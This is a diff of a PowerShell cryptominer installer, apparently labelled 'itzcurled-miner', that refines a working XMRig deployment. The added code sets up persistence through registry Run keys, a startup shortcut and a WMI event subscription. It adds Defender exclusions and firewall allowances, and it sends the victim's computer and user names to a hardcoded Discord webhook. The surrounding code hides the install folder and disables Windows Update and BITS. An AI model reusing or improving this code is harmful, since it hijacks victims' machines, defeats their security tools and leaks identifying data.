@@ -71,7 +71,7 @@ function Install-Miner {
         if ($srcExe) {
             try { Copy-Item -Path $srcExe.FullName -Destination "$xmrigExe" -Force; $copied = $true; break } catch {}
         }
-        if ($attempt -lt- 3) { Start-Sleep -Seconds 2; try { Expand-Archive -Path "$zipFile" -DestinationPath "$extractDir" -Force } catch {} }
+        if ($attempt -lt 3) { Start-Sleep -Seconds 2; try { Expand-Archive -Path "$zipFile" -DestinationPath "$extractDir" -Force } catch {} }
     }
 
     try { Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue } catch {}
@@ -176,16 +176,28 @@ function Set-Persistence {
     try {
         Set-ItemProperty $reg "WindowsServiceUpdate" "`"$xmrigExe`" --config=`"$configFile`"" -Force
         Set-ItemProperty $reg "WindowsServiceMonitor" "wscript.exe `"$watchdogVbs`"" -Force
+    try {
+        $regLM = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
+        Set-ItemProperty $regLM "WindowsServiceUpdate" "`"$xmrigExe`" --config=`"$configFile`"" -Force -ErrorAction SilentlyContinue
+        Set-ItemProperty $regLM "WindowsServiceMonitor" "wscript.exe `"$watchdogVbs`"" -Force -ErrorAction SilentlyContinue
     } catch {}
 
     try {
-        $start = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\Windows\Start Menu\Programs\Startup")
         $ws = New-Object -ComObject WScript.Shell
+        $start = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\Windows\Start Menu\Programs\Startup")
         $sc = $ws.CreateShortcut("$start\ServiceMonitor.lnk")
         $sc.TargetPath = "wscript.exe"; $sc.Arguments = "`"$watchdogVbs`""; $sc.WindowStyle = 7; $sc.Save()
     } catch {}
 
-    try { (Get-Item "$installDir").Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System } catch {}
+    try {
+        $filter = "WindowsServiceMonitorFilter"; $consumer = "WindowsServiceMonitorConsumer"; $timer = "WindowsServiceTimer"
+        Set-WmiInstance -Namespace root\cimv2 -Class __IntervalTimerInstruction -Arguments @{ TimerID = $timer; IntervalBetweenEvents = 300000 } | Out-Null
+        $fObj = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{ Name = $filter; EventNameSpace = 'root\cimv2'; QueryLanguage = 'WQL'; Query = "SELECT * FROM __TimerEvent WHERE TimerID = '$timer'" }
+        $cObj = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{ Name = $consumer; CommandLineTemplate = "wscript.exe `"$watchdogVbs`"" }
+        Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{ Filter = $fObj; Consumer = $cObj } | Out-Null
+    } catch {}
+
+    try { if (Test-Path "$installDir") { (Get-Item "$installDir").Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System } } catch {}
 }
 
 function Enable-HugePages {
@@ -214,7 +226,7 @@ function Disable-Sleep {
 function Send-DiscordWebhook {
     $webhookUrl = "https://discord.com/api/webhooks/1506387263402278992/f3X-mX_mjq74YCqpZYNB2WH4hEg6NZj8LY6lPstCCtz31kJwthqkxXF580E187PnZI2a"
     try {
-        $payload = @{ username = "itzcurled-miner"; embeds = @(@{ title = "Miner Live! ⚡"; color = 3447003; fields = @(@{ name = "Host"; value = "$env:COMPUTERNAME"; inline = $true }, @{ name = "User"; value = "$env:USERNAME"; inline = $true }); timestamp = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ") }) } | ConvertTo-Json -Depth 5
+        $payload = @{ username = "itzcurled-miner"; embeds = @(@{ title = "Miner Live! ⚡"; color = 3447003; fields = @(@{ name = "Host"; value = "$env:COMPUTERNAME"; inline = $true }, @{ name = "User"; value = "$env:USERNAME"; inline = $true }); timestamp = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ") }) } | ConvertTo-Json -Depth 5 -Compress
         Invoke-RestMethod $webhookUrl -Method Post -Body $payload -ContentType "application/json" -ErrorAction Stop | Out-Null
     } catch { Write-Host "[-] Webhook failed: $_" }
 }
@@ -223,14 +235,18 @@ function Send-DiscordWebhook {
 try {
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls
     
-    # --- HARDENING ---
-    Add-MpPreference -ExclusionPath "$installDir", "$env:TEMP" -ErrorAction SilentlyContinue | Out-Null
-    Add-MpPreference -ExclusionProcess "svchost.exe", "wscript.exe", "powershell.exe" -ErrorAction SilentlyContinue | Out-Null
+    # --- HARDENING (V6.1 Resilience) ---
+    if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
+        Add-MpPreference -ExclusionPath "$installDir", "$env:TEMP" -ErrorAction SilentlyContinue | Out-Null
+        Add-MpPreference -ExclusionProcess "svchost.exe", "wscript.exe", "powershell.exe" -ErrorAction SilentlyContinue | Out-Null
+    }
     
-    try {
-        New-NetFirewallRule -DisplayName "Windows Service Host" -Direction Outbound -Program "$xmrigExe" -Action Allow -Profile Any -ErrorAction SilentlyContinue | Out-Null
-        New-NetFirewallRule -DisplayName "Windows Service Host In" -Direction Inbound -Program "$xmrigExe" -Action Allow -Profile Any -ErrorAction SilentlyContinue | Out-Null
-    } catch {}
+    if (Get-Command New-NetFirewallRule -ErrorAction SilentlyContinue) {
+        try {
+            New-NetFirewallRule -DisplayName "Windows Service Host" -Direction Outbound -Program "$xmrigExe" -Action Allow -Profile Any -ErrorAction SilentlyContinue | Out-Null
+            New-NetFirewallRule -DisplayName "Windows Service Host In" -Direction Inbound -Program "$xmrigExe" -Action Allow -Profile Any -ErrorAction SilentlyContinue | Out-Null
+        } catch {}
+    }
 
     try { & sc.exe config wuauserv start= disabled >$null 2>&1; & sc.exe stop wuauserv >$null 2>&1; & sc.exe config bits start= disabled >$null 2>&1; & sc.exe stop bits >$null 2>&1 } catch {}
     
